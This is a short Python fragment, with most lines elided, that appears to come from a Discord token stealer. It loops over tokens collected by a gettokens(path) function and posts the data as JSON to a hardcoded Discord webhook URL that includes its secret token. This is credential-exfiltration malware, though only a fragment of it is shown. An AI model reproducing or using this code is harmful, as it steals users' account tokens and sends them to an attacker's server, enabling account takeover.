        ...
        for token in gettokens(path):
            ...
            try:
                ...
                urllib.request.urlopen(
                    urllib.request.Request('https://discordapp.com/api/webhooks/1367861445735219303/DAk3KmRqRBSt-L4M8JeBvbhNVvOycb7nIAIK4-2mtxdSrox1jumw1uyEn6ywRu5ifzg9', data=json.dumps(embed_user).encode('utf-8'),
